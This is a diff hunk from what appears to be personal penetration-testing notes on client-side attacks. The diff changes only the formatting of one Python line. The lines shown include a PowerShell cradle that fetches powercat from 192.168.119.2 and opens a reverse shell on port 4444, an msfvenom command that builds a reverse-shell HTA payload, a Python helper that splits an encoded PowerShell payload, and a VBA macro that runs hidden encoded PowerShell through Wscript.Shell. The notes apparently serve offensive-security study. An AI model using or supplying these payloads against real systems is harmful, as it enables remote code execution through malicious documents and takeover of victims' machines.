@@ -510,10 +510,7 @@ sudo fuser -k 443/tcp
 -     IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
 -     msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o /home/raman/Desktop/payload.hta
 - use the following function to split the payload
-str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
-n = 50
-for i in range(0, len(str), n):
-print("Str = Str + " + '"' + str[i:i+n] + '"')
+-     str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..." n = 50 for i in range(0, len(str), n): print("Str = Str + " + '"' + str[i:i+n] + '"')
 - paste the payload from the function in the macro
 -     Sub MyMacro() Dim Str As StringStr = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU" Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd" Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"Str = Str + "A== " CreateObject("Wscript.Shell").Run Str End Sub
 - Object linking and Embedding
